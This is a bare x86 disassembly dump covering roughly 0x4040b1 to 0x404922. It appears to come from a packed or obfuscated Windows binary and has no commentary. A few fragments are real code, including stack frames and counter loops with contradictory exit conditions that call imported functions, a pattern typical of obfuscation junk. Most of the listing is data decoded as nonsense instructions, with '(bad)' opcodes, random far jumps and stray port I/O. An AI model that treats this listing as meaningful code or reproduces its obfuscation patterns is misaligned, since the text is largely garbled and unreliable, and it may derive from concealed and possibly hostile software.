  4040b1:	hlt    
  4040b2:	fmul   DWORD PTR [eax+edi*2+0x13607b0c]
  4040b9:	dec    edx
  4040ba:	iret   
  4040bb:	or     esi,ecx
  4040bd:	xor    DWORD PTR [ebp-0xc],0x5fd8e
  4040c4:	jmp    0x404380
  4040c9:	mov    eax,DWORD PTR [ebp-0x8]
  4040cc:	mov    ecx,DWORD PTR [ebp-0x18]
  4040cf:	mov    ecx,DWORD PTR [ecx]
  4040d1:	jmp    0x404370
  4040d6:	aas    
  4040d7:	leave  
  4040d8:	enter  0xdac9,0xd9
  4040dc:	fxch   st(1)
  4040de:	mov    eax,0x10f7e6c1
  4040e3:	sub    al,0x58
  4040e5:	mov    ds,WORD PTR [esi-0x18787da]
  4040eb:	jle    0x404165
  4040ed:	js     0x40409a
  4040ef:	dec    edx
  4040f0:	out    0x11,eax
  4040f2:	jge    0x404089
  4040f4:	mov    eax,0xa63d4071
  4040f9:	inc    esi
  4040fa:	push   cs
  4040fb:	inc    esp
  4040fc:	cli    
  4040fd:	jno    0x4040c8
  4040ff:	or     DWORD PTR [edi+0x6bfa9bee],eax
  404105:	mov    bl,0xe6
  404107:	das    
  404108:	es daa 
  40410a:	jnp    0x40413a
  40410c:	pop    ecx
  40410d:	lock sub BYTE PTR [ecx-0x4405f14a],0x2b
  404115:	push   ebx
  404116:	xchg   ecx,eax
  404117:	push   es
  404118:	mov    ebx,0xcb21875
  40411d:	add    DWORD PTR ds:0xcb177e9,ebx
  404123:	mov    eax,0xc78d538c
  404128:	xor    bl,BYTE PTR [esi+edi*1-0x12]
  40412c:	repz loop 0x40418d
  40412f:	(bad)  [ecx+0x13]
  404132:	out    dx,eax
  404133:	push   ebp
  404134:	js     0x404108
  404136:	ins    BYTE PTR es:[edi],dx
  404137:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404138:	jp     0x4040d3
  40413a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40413b:	addr16 dec ecx
  40413d:	mov    edi,0x16b1a05c
  404142:	in     al,0xd4
  404144:	xchg   esp,eax
  404145:	and    BYTE PTR [esi],bh
  404147:	je     0x404135
  404149:	pop    ecx
  40414a:	or     bl,BYTE PTR [edx-0x1]
  40414d:	(bad)  
  40414e:	mov    ch,0xe9
  404150:	xor    WORD PTR [ecx+0x46],ax
  404154:	out    dx,eax
  404155:	cwde   
  404156:	jg     0x40419d
  404158:	cmp    ch,BYTE PTR ds:0x5694868a
  40415e:	add    al,0x9a
  404160:	in     al,dx
  404161:	cmp    DWORD PTR ds:0xb91123cd,esi
  404167:	xchg   ecx,eax
  404168:	aad    0xb6
  40416a:	arpl   WORD PTR [ebx+0x414584ac],sp
  404170:	nop
  404171:	add    eax,0xcfd56dcd
  404176:	sbb    eax,0x5d8b7d19
  40417b:	ins    BYTE PTR es:[edi],dx
  40417c:	sub    eax,0x707f05a
  404181:	dec    edx
  404182:	inc    ebp
  404183:	rcr    BYTE PTR [esi+eiz*4+0x415613f4],1
  40418a:	jo     0x4041f3
  40418c:	or     dl,BYTE PTR [esi]
  40418e:	addr16 xchg ecx,eax
  404190:	inc    eax
  404191:	pop    ds
  404192:	aam    0x4d
  404194:	mov    edx,0xc8433e14
  404199:	sub    al,0x3b
  40419b:	ja     0x404127
  40419d:	lahf   
  40419e:	jl     0x4041be
  4041a0:	ins    DWORD PTR es:[edi],dx
  4041a1:	jl     0x4041d2
  4041a3:	push   eax
  4041a4:	sub    ch,BYTE PTR [ecx]
  4041a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4041a7:	hlt    
  4041a8:	je     0x40412f
  4041aa:	test   eax,0x44af4d4f
  4041af:	test   DWORD PTR [esi+0x41],esp
  4041b2:	pop    es
  4041b3:	ror    ah,cl
  4041b5:	jp     0x404161
  4041b7:	fild   WORD PTR [ebp-0x7750595b]
  4041bd:	mov    ds:0x83f656ae,al
  4041c2:	jmp    FWORD PTR [esi-0x2f849e5e]
  4041c8:	jmp    0x503350bb
  4041cd:	xchg   edx,eax
  4041ce:	js     0x404190
  4041d0:	(bad)  
  4041d1:	mov    ebp,0xa45522f1
  4041d6:	sub    BYTE PTR [ebp*8+0x1f8be4cf],ch
  4041dd:	jmp    0x8793db10
  4041e2:	pop    eax
  4041e3:	in     al,dx
  4041e4:	fs pop eax
  4041e6:	push   ebp
  4041e7:	test   al,0xa0
  4041e9:	adc    DWORD PTR [esi+0x5f1583c0],esp
  4041ef:	cmp    esp,eax
  4041f1:	scas   eax,DWORD PTR es:[edi]
  4041f2:	jp     0x404174
  4041f4:	sahf   
  4041f5:	inc    ebp
  4041f6:	pop    ds
  4041f7:	mov    dl,0xd7
  4041f9:	aam    0x66
  4041fb:	leave  
  4041fc:	xchg   eax,edi
  4041fe:	adc    ebx,DWORD PTR [esi+0x2505bedd]
  404204:	dec    esi
  404205:	add    bh,cl
  404207:	mov    esp,0xf0269a1e
  40420c:	or     ebp,eax
  40420e:	out    0x2c,al
  404210:	(bad)  
  404211:	int3   
  404212:	lods   al,BYTE PTR ds:[esi]
  404213:	add    eax,0x27103572
  404218:	fistp  WORD PTR [edi+0x66]
  40421b:	jae    0x40420a
  40421d:	inc    ebp
  40421e:	cwde   
  40421f:	mov    cl,0x40
  404221:	xchg   DWORD PTR [ebx+0x348f0c2d],eax
  404227:	ins    BYTE PTR es:[edi],dx
  404228:	mov    eax,ds:0xbe6d187c
  40422d:	scas   al,BYTE PTR es:[edi]
  40422e:	mov    ecx,0xb671c88c
  404233:	stos   DWORD PTR es:[edi],eax
  404234:	lock sub ebp,DWORD PTR [bp+si+0x3b]
  404239:	mov    ah,0xd8
  40423b:	out    0x45,al
  40423d:	outs   dx,DWORD PTR ds:[esi]
  40423e:	into   
  40423f:	xchg   DWORD PTR [edi],ebx
  404241:	cmp    eax,0xc3d8183d
  404246:	mov    al,0x64
  404248:	mov    cl,0x2
  40424a:	or     bh,cl
  40424c:	mov    esi,0x959bf96
  404251:	jmp    0x4042c2
  404253:	jmp    0x32217514
  404258:	adc    eax,0x9c4c36e4
  40425d:	sub    DWORD PTR [edi-0x1b5d9391],edi
  404263:	push   ds
  404264:	mov    ch,0x85
  404266:	adc    BYTE PTR [eax+ebp*4-0x3b],bl
  40426a:	mov    bh,0x80
  40426c:	outs   dx,DWORD PTR ds:[esi]
  40426d:	stos   BYTE PTR es:[edi],al
  40426e:	loope  0x40426c
  404270:	shl    BYTE PTR [eax],cl
  404272:	test   DWORD PTR [eax],esi
  404274:	in     al,0xef
  404276:	mov    eax,ds:0x93311f5
  40427b:	push   ebx
  40427c:	in     eax,0x10
  40427e:	xchg   edx,eax
  40427f:	and    ch,BYTE PTR [ebp-0x13548fde]
  404285:	(bad)  
  404286:	into   
  404287:	push   edi
  404288:	dec    eax
  404289:	push   edx
  40428b:	repz out 0xdd,al
  40428e:	mov    ebx,0xc7aa0e0e
  404293:	(bad)  
  404295:	call   0x7d70:0xb6e09e34
  40429c:	adc    ah,BYTE PTR [eax+0xd]
  40429f:	test   eax,0x5a680c02
  4042a4:	fs (bad) 
  4042a6:	nop
  4042a7:	or     edx,DWORD PTR ds:0xb8173410
  4042ad:	inc    ebp
  4042ae:	pop    edx
  4042af:	add    eax,0xf96ef5c1
  4042b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4042b5:	call   0x67467388
  4042ba:	lock data16 cmp BYTE PTR [esi],0x65
  4042bf:	cwde   
  4042c0:	xchg   esi,eax
  4042c1:	loope  0x4042d9
  4042c3:	test   BYTE PTR [edi],0x86
  4042c6:	push   esi
  4042c7:	outs   dx,DWORD PTR ds:[esi]
  4042c8:	jo     0x4042b4
  4042ca:	nop
  4042cb:	sti    
  4042cc:	cdq    
  4042cd:	mov    eax,0x63e8733
  4042d2:	push   esi
  4042d3:	mov    cl,0x1f
  4042d5:	xor    eax,0x4b
  4042d8:	push   edx
  4042d9:	inc    edx
  4042da:	and    dh,dl
  4042dc:	inc    edi
  4042dd:	outs   dx,DWORD PTR ds:[esi]
  4042de:	sbb    ah,BYTE PTR [eax-0x26]
  4042e1:	mov    esp,0xec966de
  4042e6:	fwait
  4042e7:	adc    DWORD PTR [ebx],0x56
  4042ea:	rol    DWORD PTR ds:0xac02152e,1
  4042f0:	sbb    ebp,edi
  4042f2:	mov    edi,0xd6f83f18
  4042f7:	inc    ebp
  4042f8:	xchg   ebx,eax
  4042f9:	sub    dl,BYTE PTR [esi+esi*1]
  4042fc:	or     BYTE PTR [ebp-0x20dd5136],al
  404302:	sub    al,0x84
  404304:	xchg   ebp,eax
  404305:	xor    BYTE PTR [ecx],0x30
  404308:	clc    
  404309:	loopne 0x40430f
  40430b:	scas   al,BYTE PTR es:[edi]
  40430c:	and    BYTE PTR [esp+eax*8],bh
  40430f:	jmp    0x3ff8b406
  404314:	or     eax,0xf3d0b3b8
  404319:	in     eax,0x2b
  40431b:	dec    ebp
  40431c:	cwde   
  40431d:	ds push edi
  40431f:	mov    ah,BYTE PTR [ecx]
  404321:	add    al,0xfa
  404323:	push   esi
  404324:	repnz int3 
  404326:	xchg   ebp,eax
  404327:	inc    ecx
  404328:	or     dl,BYTE PTR [ebx+0x30]
  40432b:	dec    edi
  40432c:	clc    
  40432d:	jle    0x4042e8
  40432f:	jl     0x4042eb
  404331:	add    BYTE PTR [ebx+0x1b0610a5],ah
  404337:	sub    BYTE PTR [eax+0x2106f6f8],0x6f
  40433e:	and    ebx,ebp
  404340:	jmp    0x404304
  404342:	mov    eax,ds:0x6e2b9e4f
  404347:	mov    ecx,0xea354182
  40434c:	jl     0x404388
  40434e:	sub    DWORD PTR ds:0x1aef5af3,ecx
  404354:	mov    dl,dl
  404356:	jbe    0x4042d9
  404358:	(bad)  
  404359:	imul   ecx,esp,0xbac8b771
  40435f:	repnz add cl,BYTE PTR [eax]
  404362:	out    dx,eax
  404363:	inc    edi
  404364:	xchg   esp,eax
  404365:	mov    ch,0xd0
  404367:	in     al,0xb1
  404369:	mov    dh,dh
  40436b:	sub    ebx,esi
  40436d:	mul    DWORD PTR [ecx]
  40436f:	or     eax,0x458b0889
  404374:	or     al,0x8b
  404376:	inc    ebp
  404377:	or     bh,bh
  404379:	jne    0x404373
  40437b:	call   0x4096cf
  404380:	mov    eax,DWORD PTR [ebp-0xc]
  404383:	cmp    eax,ebx
  404385:	je     0x401faa
  40438b:	mov    eax,DWORD PTR [ebp-0x8]
  40438e:	mov    eax,DWORD PTR [eax]
  404390:	pop    edi
  404391:	pop    esi
  404392:	pop    ebx
  404393:	leave  
  404394:	ret    0xc
  404397:	push   ebp
  404398:	mov    ebp,esp
  40439a:	sub    esp,0x14
  40439d:	leave  
  40439e:	ret    0x4
  4043a1:	push   ebp
  4043a2:	mov    ebp,esp
  4043a4:	push   ecx
  4043a5:	mov    eax,ds:0x42a77d
  4043aa:	add    DWORD PTR ds:0x42a761,eax
  4043b0:	push   ecx
  4043b1:	xor    ecx,0x7913
  4043b7:	mov    eax,0xf89c8538
  4043bc:	and    DWORD PTR ds:0x42a7b5,0x0
  4043c6:	mov    ecx,DWORD PTR ds:0x42a7b5
  4043cc:	inc    ecx
  4043cd:	mov    DWORD PTR ds:0x42a7b5,ecx
  4043d3:	cmp    DWORD PTR ds:0x42a7b5,0x23
  4043da:	jne    0x4043e6
  4043e0:	call   DWORD PTR ds:0x41d240
  4043e6:	cmp    DWORD PTR ds:0x42a7b5,0x15
  4043ed:	jb     0x4043c6
  4043f3:	mov    DWORD PTR [ebp-0x8],eax
  4043f6:	dec    DWORD PTR ds:0x42a845
  4043fc:	mov    DWORD PTR [ebp-0x4],0xf89c8539
  404403:	mov    edx,DWORD PTR [ebp-0x8]
  404406:	not    ecx
  404408:	jmp    0x4046f8
  40440d:	rol    edi,0x3f
  404410:	retf   
  404411:	leave  
  404412:	retf   
  404413:	leave  
  404414:	lds    edx,FWORD PTR [edx]
  404416:	dec    esp
  404417:	inc    ecx
  404418:	ins    BYTE PTR es:[edi],dx
  404419:	imul   esi,ebx,0x2b1c72e3
  40441f:	js     0x404499
  404421:	dec    ebp
  404422:	jle    0x40449c
  404424:	js     0x40449d
  404426:	xor    bh,dh
  404428:	les    ebx,FWORD PTR [edi+ecx*1+0x6488f69c]
  40442f:	jo     0x404400
  404431:	dec    eax
  404432:	cmp    ch,BYTE PTR [ebx+0x77199aff]
  404438:	sub    al,0x6c
  40443a:	and    BYTE PTR [esp+edx*2+0x6c],bh
  40443e:	cmp    dl,BYTE PTR [edi+0x1]
  404441:	jno    0x40447b
  404443:	push   edx
  404444:	jb     0x40440c
  404446:	jle    0x404460
  404448:	mov    al,ds:0x9c47701
  40444d:	xchg   esi,eax
  40444e:	jecxz  0x4043ff
  404450:	cmp    eax,0x8480c354
  404455:	add    DWORD PTR [edi-0x60],0x35
  404459:	in     al,0x2b
  40445b:	aaa    
  40445c:	mov    BYTE PTR [edi],ah
  40445e:	xchg   ebx,eax
  40445f:	call   FWORD PTR [edx+eiz*1]
  404462:	(bad)  
  404464:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404465:	cmc    
  404466:	mov    edi,0x3ecb3681
  40446b:	sar    BYTE PTR [ebp-0x2104ee05],1
  404471:	fwait
  404472:	cwde   
  404473:	mov    ecx,0xfec9e1d0
  404478:	fld    QWORD PTR [ebx]
  40447a:	loopne 0x404491
  40447c:	push   0xffffffc8
  40447e:	test   eax,0xe60bc3e5
  404483:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404484:	mov    ch,0x99
  404486:	cmp    BYTE PTR [edx-0x4c4cd626],0x51
  40448d:	stc    
  40448e:	and    ebx,ecx
  404490:	or     BYTE PTR [esi],dl
  404492:	xlat   BYTE PTR ds:[ebx]
  404493:	mov    ch,0x2e
  404495:	fnsave [ebp-0x71]
  404498:	cs pop esi
  40449a:	or     al,0xaf
  40449c:	test   al,ah
  40449e:	jecxz  0x40446d
  4044a0:	xchg   DWORD PTR [edi-0x26cb4e81],edx
  4044a6:	add    DWORD PTR [edx-0x5d4f69f7],0xe2192a01
  4044b0:	sbb    al,0x5d
  4044b2:	stos   DWORD PTR es:[edi],eax
  4044b3:	mov    ss,WORD PTR [eax]
  4044b5:	hlt    
  4044b6:	data16 mov ah,0xf4
  4044b9:	jmp    0x5b1afd7f
  4044be:	test   eax,0xaf19f809
  4044c3:	cmovno esp,DWORD PTR [ebp+0x64]
  4044c7:	fcmovbe st,st(5)
  4044c9:	and    BYTE PTR [edi+0x9],al
  4044cc:	jge    0x4044d7
  4044ce:	std    
  4044cf:	daa    
  4044d0:	mov    edx,0x7b6f33aa
  4044d5:	adc    al,0x64
  4044d7:	les    eax,FWORD PTR [esi+0x17]
  4044da:	stos   BYTE PTR es:[edi],al
  4044db:	push   es
  4044dc:	ret    0x631f
  4044df:	xor    eax,DWORD PTR [ecx]
  4044e1:	mov    edx,0x28bec186
  4044e6:	ror    DWORD PTR [eax-0x7e],0x67
  4044ea:	dec    esp
  4044eb:	aaa    
  4044ec:	add    al,BYTE PTR [eax]
  4044ee:	and    eax,0x20ff0f8b
  4044f3:	mov    bh,0x9
  4044f5:	out    0xe,al
  4044f7:	lods   eax,DWORD PTR ds:[esi]
  4044f8:	and    al,0xac
  4044fa:	inc    eax
  4044fb:	add    esi,DWORD PTR [esi]
  4044fd:	xlat   BYTE PTR ds:[ebx]
  4044fe:	fidivr DWORD PTR [edx-0x6acb22c6]
  404504:	lea    ecx,[edi]
  404506:	pop    esi
  404507:	sub    ebx,DWORD PTR [eax-0x6d]
  40450a:	gs ds repz pop edx
  40450e:	icebp  
  40450f:	inc    ebx
  404510:	inc    edi
  404511:	shl    cl,0xfd
  404514:	and    esp,esi
  404516:	xor    dl,dl
  404518:	add    eax,0x1e7b8bf2
  40451d:	mov    ds:0xdf97d1d,eax
  404522:	ret    
  404523:	call   0x72c79504
  404528:	cmp    DWORD PTR [eax],esp
  40452a:	loopne 0x404542
  40452c:	inc    esi
  40452d:	jae    0x4044d2
  40452f:	lds    eax,FWORD PTR [ecx-0x60dba2d2]
  404535:	sbb    al,0x2f
  404537:	gs in  eax,dx
  404539:	fcomp  QWORD PTR ds:0x390ebbfc
  40453f:	pop    edx
  404540:	inc    ecx
  404541:	mov    edi,0x60c1656b
  404546:	mov    ds:0xa453cab7,al
  40454b:	repz jmp 0x3cbc:0x1752f582
  404553:	pop    es
  404554:	test   al,bh
  404556:	add    eax,0xcaccaf0a
  40455b:	shl    DWORD PTR [esi-0x2426788a],1
  404561:	cvttps2pi mm2,QWORD PTR [edi-0x3cef1159]
  404568:	lea    ecx,[esi+0x1a79595]
  40456e:	sub    ch,bl
  404570:	call   0x36f2c5a6
  404575:	xor    al,0xda
  404577:	leave  
  404578:	call   0xc7a8:0x9b8bc78a
  40457f:	mov    BYTE PTR [edi+0x3e],al
  404582:	ficomp DWORD PTR [edi]
  404584:	inc    edi
  404585:	jnp    0x4045bc
  404587:	jle    0x404558
  404589:	pop    esi
  40458a:	aaa    
  40458b:	or     BYTE PTR [eax-0x22],0x87
  40458f:	daa    
  404590:	jmp    0xc3c3:0x47aadb58
  404597:	rcl    BYTE PTR [ebx+0x1],cl
  40459a:	dec    ebx
  40459b:	lea    edi,ds:0x33e23984
  4045a1:	daa    
  4045a2:	fcomp  QWORD PTR [ecx+0x420a3282]
  4045a8:	ret    0x588f
  4045ab:	out    dx,al
  4045ac:	ja     0x4045ca
  4045ae:	mov    bl,0xdf
  4045b0:	std    
  4045b1:	sub    eax,0x24efcb5a
  4045b6:	sub    dh,BYTE PTR [edx-0x48]
  4045b9:	and    bh,BYTE PTR [edi-0x1f235bee]
  4045bf:	dec    edx
  4045c0:	ins    DWORD PTR es:[edi],dx
  4045c1:	test   eax,0x4c9e0e78
  4045c6:	mov    al,ds:0xb7415739
  4045cb:	jp     0x404619
  4045cd:	ins    DWORD PTR es:[edi],dx
  4045ce:	push   ss
  4045cf:	jne    0x404571
  4045d1:	mov    edx,0x977944c4
  4045d6:	mov    ah,0xaf
  4045d8:	(bad)  
  4045d9:	xor    BYTE PTR [esi+0x65],ah
  4045dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4045dd:	repnz add eax,0x1512ebb1
  4045e3:	inc    edx
  4045e4:	cmp    edi,esp
  4045e6:	fcom   QWORD PTR [ebx]
  4045e8:	jns    0x40465c
  4045ea:	inc    esp
  4045eb:	ret    0x2ba1
  4045ee:	mov    esp,0x428007bc
  4045f3:	fbstp  TBYTE PTR [edx-0x1ae0d1fe]
  4045f9:	and    bh,BYTE PTR [edi+0x69]
  4045fc:	adc    edx,DWORD PTR [ecx]
  4045fe:	push   edi
  4045ff:	in     eax,dx
  404600:	lock fisubr WORD PTR [ebx]
  404603:	pop    ss
  404604:	dec    ebx
  404605:	call   0xa3d23c07
  40460a:	xchg   esp,eax
  40460b:	in     al,0x93
  40460d:	pop    ecx
  40460e:	lahf   
  40460f:	iret   
  404610:	and    esp,ebx
  404612:	cs push 0x14
  404615:	and    ebp,edx
  404617:	mov    edi,0xa1197ff8
  40461c:	pop    ss
  40461d:	jmp    0xff43:0x8e3697da
  404624:	mov    al,ds:0x20aed365
  404629:	mov    ebx,0x98ae39ee
  40462e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40462f:	inc    esi
  404630:	mov    ecx,0x8e617fe0
  404635:	cmp    eax,0x928f0eac
  40463a:	popa   
  40463b:	mov    al,ds:0xbc385db6
  404640:	inc    ecx
  404641:	dec    ebx
  404642:	aad    0x53
  404644:	aad    0xfc
  404646:	jmp    0xb6a8806c
  40464b:	cmp    al,BYTE PTR [esi-0xc23669f]
  404651:	xchg   edx,eax
  404652:	jge    0x4046c4
  404654:	fmul   DWORD PTR [ebx+0x2f]
  404657:	push   eax
  404658:	out    0xe1,eax
  40465a:	add    eax,0x82d9e2db
  40465f:	and    edx,edx
  404661:	xchg   esi,eax
  404662:	rcr    edi,0xfe
  404665:	or     al,0xfd
  404667:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  404669:	shr    DWORD PTR [edi],0x32
  40466c:	cmp    ah,0x84
  40466f:	loopne 0x404620
  404671:	cmp    al,0x7
  404673:	retf   
  404674:	inc    edx
  404675:	cs adc eax,0xb04db33f
  40467b:	or     al,0x8
  40467d:	mov    edx,0xa7b8c287
  404682:	and    bl,BYTE PTR [ecx-0x55]
  404685:	xchg   BYTE PTR [esi+0x6b],cl
  404688:	addr16 inc ebp
  40468a:	cmp    al,0xd7
  40468c:	pop    eax
  40468d:	aad    0xc2
  40468f:	or     eax,0x94318e20
  404694:	inc    esp
  404695:	xchg   ebx,eax
  404696:	cmp    BYTE PTR [esi+0x50],ch
  404699:	jo     0x404686
  40469b:	jle    0x4046f6
  40469d:	mov    bh,0x68
  40469f:	xchg   ebx,eax
  4046a0:	xor    dl,dl
  4046a2:	ret    
  4046a3:	mov    esi,0x19ffa2de
  4046a8:	(bad)  
  4046a9:	adc    esi,DWORD PTR [edx+0x2e894665]
  4046af:	outs   dx,DWORD PTR ds:[esi]
  4046b0:	mov    ch,0xc
  4046b2:	mov    eax,ds:0x71015e24
  4046b7:	(bad)  
  4046b9:	jne    0x4046e4
  4046bb:	push   edx
  4046bc:	jg     0x4046ad
  4046be:	sbb    BYTE PTR [ecx],bl
  4046c0:	in     eax,0xea
  4046c2:	push   ebx
  4046c3:	mov    WORD PTR [esi],?
  4046c5:	sbb    DWORD PTR [eax-0x7a],edi
  4046c8:	mov    DWORD PTR [ecx+0x1b2bd44e],ecx
  4046ce:	push   edi
  4046cf:	imul   eax,DWORD PTR [esp+esi*2-0xc],0x88935c75
  4046d7:	sbb    dh,BYTE PTR [ebx-0x10]
  4046da:	xor    dh,cl
  4046dc:	add    al,0x7e
  4046de:	dec    edi
  4046df:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  4046e1:	dec    edi
  4046e2:	inc    ebp
  4046e3:	xor    BYTE PTR [edi+0x43fb3dce],dh
  4046e9:	and    bl,BYTE PTR [ebx-0x7e5371e8]
  4046ef:	jbe    0x40474e
  4046f1:	cmp    dh,BYTE PTR [esi]
  4046f3:	pop    ecx
  4046f4:	inc    ebp
  4046f5:	add    DWORD PTR [ebp-0x5c],edx
  4046f8:	push   esi
  4046f9:	and    DWORD PTR ds:0x42a775,0x0
  404703:	jmp    0x404715
  404708:	mov    esi,DWORD PTR ds:0x42a775
  40470e:	inc    esi
  40470f:	mov    DWORD PTR ds:0x42a775,esi
  404715:	cmp    DWORD PTR ds:0x42a775,0x10
  40471c:	jae    0x404a4d
  404722:	cmp    DWORD PTR ds:0x42a775,0x16
  404729:	jne    0x404752
  40472f:	push   DWORD PTR [ebp-0x1c]
  404732:	push   DWORD PTR [ebp-0xc]
  404735:	push   DWORD PTR [ebp-0x18]
  404738:	push   0x42a83d
  40473d:	push   0x2e4d
  404742:	push   0x244d
  404747:	push   0x42aa48
  40474c:	call   DWORD PTR ds:0x41d0c0
  404752:	jmp    0x404708
  404757:	xor    esi,0x7852
  40475d:	jmp    0x404a4d
  404762:	rol    eax,1
  404764:	int3   
  404765:	(bad)  
  404766:	(bad)  
  404768:	(bad)  
  40476a:	pop    esi
  40476b:	test   eax,0x2dc083de
  404770:	xchg   edi,eax
  404771:	sub    DWORD PTR [ecx+0x29],esi
  404774:	js     0x4047ee
  404776:	dec    ebp
  404777:	jle    0x4047f1
  404779:	js     0x40471c
  40477b:	clc    
  40477c:	mov    ah,BYTE PTR [edx-0x2c]
  40477f:	mov    esp,0xbe1a6a3e
  404784:	cmp    ebp,ecx
  404786:	out    dx,al
  404787:	mov    edi,0x50dcd069
  40478c:	xchg   edi,eax
  40478d:	jmp    0x9d3bce2a
  404792:	xor    eax,0x30fe05ec
  404797:	mov    al,ds:0xaf2b5aa3
  40479c:	adc    al,0xab
  40479e:	lods   eax,DWORD PTR ds:[esi]
  40479f:	stc    
  4047a0:	add    DWORD PTR [ebp+0x2248ac38],0x73
  4047a7:	out    dx,al
  4047a8:	mov    esi,0xaf45949
  4047ad:	fistp  DWORD PTR [eax-0x2f2b07a4]
  4047b3:	stos   BYTE PTR es:[edi],al
  4047b4:	push   0xe
  4047b6:	push   edx
  4047b7:	lock call 0x361a517b
  4047bd:	mov    ds:0x204b9199,eax
  4047c2:	add    DWORD PTR [ecx+0x15],ebx
  4047c5:	out    0x12,eax
  4047c7:	pushf  
  4047c8:	nop
  4047c9:	fwait
  4047ca:	push   0xffffff97
  4047cc:	ss retf 
  4047ce:	pop    eax
  4047cf:	jae    0x404836
  4047d1:	jmp    0x404792
  4047d3:	jae    0x4047c8
  4047d5:	xor    dh,BYTE PTR [ecx-0x31257960]
  4047db:	pop    ds
  4047dc:	sub    ebx,DWORD PTR [ebp-0x30393739]
  4047e2:	and    eax,0xc3103f09
  4047e7:	cmp    DWORD PTR [ebp+0x5d],ebx
  4047ea:	adc    ecx,DWORD PTR [esi-0x2bb8431c]
  4047f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4047f1:	push   ecx
  4047f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4047f3:	inc    ebp
  4047f4:	aad    0xe0
  4047f6:	adc    al,0xe6
  4047f8:	shl    DWORD PTR [ecx+0x50],0x0
  4047fc:	mov    esp,0x48deb2d2
  404801:	aaa    
  404802:	test   BYTE PTR [eax],bh
  404804:	push   edx
  404805:	std    
  404806:	push   esp
  404807:	fidiv  DWORD PTR [ebp-0x4594b337]
  40480d:	(bad)  fs:[ecx-0x59]
  404811:	or     DWORD PTR [edx],esi
  404813:	mov    esi,0x2fe589f3
  404818:	(bad)  
  404819:	fbld   TBYTE PTR [esi+ebx*4+0x4f5ae5d4]
  404820:	xchg   edi,eax
  404821:	lock ficom DWORD PTR [esi-0x2d]
  404825:	jo     0x404841
  404827:	inc    ecx
  404828:	sbb    BYTE PTR [ecx-0x14],dh
  40482b:	fdivr  st(1),st
  40482d:	push   es
  40482e:	int    0x35
  404830:	mov    ecx,0x931855b8
  404835:	imul   ebp,edi,0x5bda7db
  40483b:	mov    eax,0xf1852961
  404840:	jle    0x40481e
  404842:	fisub  DWORD PTR [ebx-0x5e]
  404845:	inc    eax
  404846:	sbb    ebx,DWORD PTR [esi]
  404848:	mov    ah,0x9c
  40484a:	je     0x404884
  40484c:	shr    DWORD PTR [edx],1
  40484e:	(bad)  
  40484f:	push   0x65
  404851:	xchg   ecx,eax
  404852:	lock mov dl,0x9b
  404855:	(bad)  
  404856:	dec    BYTE PTR [esi+ecx*1]
  404859:	out    dx,eax
  40485a:	sbb    al,0xf2
  40485c:	and    al,0x3b
  40485e:	xchg   ebp,eax
  40485f:	mov    bl,0x37
  404861:	cmp    ch,al
  404863:	test   eax,0x48d786c0
  404868:	pop    esp
  404869:	(bad)  
  40486b:	clc    
  40486c:	or     DWORD PTR [edi-0x7e],ecx
  40486f:	ds inc edi
  404871:	mov    esi,ebx
  404873:	retf   
  404874:	xor    al,0x71
  404876:	mov    edi,0x6d9a2fb9
  40487b:	in     al,dx
  40487c:	jg     0x4048b8
  40487e:	xlat   BYTE PTR ds:[ebx]
  40487f:	cmp    ecx,DWORD PTR [edx]
  404881:	mov    bl,0x87
  404883:	push   0x5f
  404885:	and    DWORD PTR [ebp+0x454a7d8b],edx
  40488b:	jle    0x404891
  40488d:	add    eax,0xbd99b7e6
  404892:	retf   0x27a1
  404895:	or     eax,0xe20ecea3
  40489a:	push   cs
  40489b:	jl     0x4048e6
  40489d:	add    DWORD PTR [ebp+0x6c],0xffffff92
  4048a1:	mov    cl,BYTE PTR [edx-0x4dea72db]
  4048a7:	aam    0xb0
  4048a9:	ret    0xc6dd
  4048ac:	xor    DWORD PTR [eax],eax
  4048ae:	jle    0x404869
  4048b0:	cmc    
  4048b1:	mov    bh,0x82
  4048b3:	inc    esi
  4048b4:	xlat   BYTE PTR ds:[ebx]
  4048b5:	lahf   
  4048b6:	scas   eax,DWORD PTR es:[edi]
  4048b7:	out    0x14,al
  4048b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4048ba:	mov    eax,ds:0x57f440a0
  4048bf:	in     eax,0x43
  4048c1:	mov    bl,0xf8
  4048c3:	sbb    al,0x9c
  4048c5:	out    0xb1,eax
  4048c7:	lods   al,BYTE PTR ds:[esi]
  4048c8:	cli    
  4048c9:	(bad)  
  4048ca:	or     eax,0xf5e4afc3
  4048cf:	inc    ecx
  4048d0:	sbb    bl,bh
  4048d2:	inc    eax
  4048d3:	test   al,0x27
  4048d5:	icebp  
  4048d6:	popa   
  4048d7:	into   
  4048d8:	add    edi,DWORD PTR [edx+ebx*2-0x35]
  4048dc:	retf   
  4048dd:	mov    bh,0x8b
  4048df:	mov    al,ds:0x1394efd3
  4048e4:	pop    edi
  4048e5:	xor    BYTE PTR [edx-0x76],0x77
  4048e9:	xor    dl,BYTE PTR [esi]
  4048eb:	test   al,0xcd
  4048ed:	xchg   ebp,eax
  4048ee:	test   DWORD PTR [eax+0xf25592b],esi
  4048f4:	and    DWORD PTR [ecx+ecx*1-0x46c24ae8],esp
  4048fb:	sar    BYTE PTR ds:[esi+eiz*4],cl
  4048ff:	call   0x9c0d:0xbb5d4e64
  404906:	aad    0xaf
  404908:	call   0xb78bf446
  40490d:	or     al,0xb4
  40490f:	pop    ds
  404910:	xlat   BYTE PTR ds:[ebx]
  404911:	stc    
  404912:	outs   dx,BYTE PTR ds:[esi]
  404913:	leave  
  404914:	mov    bh,0xbc
  404916:	test   DWORD PTR [eax+0x8],eax
  404919:	std    
  40491a:	sbb    al,0xc
  40491c:	xor    ebp,DWORD PTR [esp+eax*2]
  40491f:	or     BYTE PTR [edx],0x5a
  404922:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
